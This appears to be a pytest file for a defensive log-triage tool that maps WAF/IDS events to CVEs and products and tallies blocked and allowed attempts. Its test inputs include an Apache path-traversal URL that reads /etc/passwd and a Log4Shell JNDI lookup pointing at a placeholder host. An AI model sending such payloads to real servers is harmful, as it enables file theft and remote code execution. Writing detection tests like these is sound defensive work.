"""triage CVE/제품군 인식 — 요청/분석 엔진의 요청 지문을 재사용한다. 로컬·무반출이며
'공격 시도' 식별일 뿐 성공/침해 판정이 아니다."""
import json

from core.triage_cve import identify
from core.triage_statistics import summarize_statistics
from core.triage import analyze


def test_identify_from_device_signature_is_high_trust():
    r = identify(signature='Apache Struts RCE CVE-2017-5638 attempt')
    assert 'CVE-2017-5638' in r['cves'] and 'struts' in r['products'] and r['source'] == 'device'


def test_identify_from_request_fingerprint_apache():
    r = identify(url='/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd')
    assert 'CVE-2021-41773' in r['cves'] and 'apache-httpd' in r['products'] and r['source'] == 'inferred'


def test_identify_log4shell_header_maps_to_log4j():
    r = identify(url='/x', req_headers={'User-Agent': '${jndi:ldap://probe.example.test/a}'})
    assert 'CVE-2021-44228' in r['cves'] and 'log4j' in r['products']


def test_identify_empty_when_no_signal():
    assert identify(url='/normal/path', signature='') == dict(cves=[], products=[], source='')


def test_statistics_aggregate_cve_and_products_with_actions():
    events = [
        dict(cve=['CVE-2021-44228'], products=['log4j'], action='blocked', host='a.test'),
        dict(cve=['CVE-2021-44228'], products=['log4j'], action='allowed', host='b.test'),
        dict(cve=['CVE-2021-41773'], products=['apache-httpd'], action='blocked', host='a.test'),
        dict(cve=[], products=[], action='unknown', host='c.test'),
    ]
    s = summarize_statistics(events)
    labels = {c['label']: c['count'] for c in s['cves']}
    assert labels['CVE-2021-44228'] == 2 and labels['CVE-2021-41773'] == 1
    log4j = next(p for p in s['products'] if p['name'] == 'log4j')
    assert log4j['records'] == 2 and log4j['actions']['blocked'] == 1 and log4j['actions']['allowed'] == 1
    assert log4j['targets'] == 2
    assert s['cve_records'] == 3            # 3 레코드가 CVE/제품을 가짐(일반 공격 레코드와 구분)


def test_analyze_end_to_end_tags_cve_and_product():
    log = json.dumps([{
        'timestamp': '2026-11-01T09:45:00+09:00', 'src_ip': '203.0.113.10', 'device_type': 'WAF',
        'evtname': 'Log4Shell attempt', 'httpHost': 'shop.example.test', 'url': '/api/products',
        'requestMethod': 'GET', 'headers': {'User-Agent': '${jndi:ldap://probe.example.test/a}'},
        'disposition': 'Block', 'resultCode': '403', 'attack_name': 'Log4Shell attempt'}])
    result = analyze(log)
    event = result['events'][0]
    assert 'CVE-2021-44228' in event['cve'] and 'log4j' in event['products']
    assert any(c['label'] == 'CVE-2021-44228' for c in result['statistics']['cves'])
    assert any(p['name'] == 'log4j' for p in result['statistics']['products'])


def test_event_name_is_used_for_product_recognition():
    import json
    from core.triage import analyze
    cases = [('Microsoft Exchange Server SSRF', 'exchange'),
             ('Cisco ASA Directory Traversal', 'cisco-asa'),
             ('Adobe ColdFusion Access Control Bypass', 'coldfusion'),
             ('React Server Components Remote Code Execution', 'react')]
    for title, product in cases:
        result = analyze(json.dumps([dict(device_type='IDS', evtname=title, host='example.test', url='/x')]))
        assert product in result['events'][0]['products']
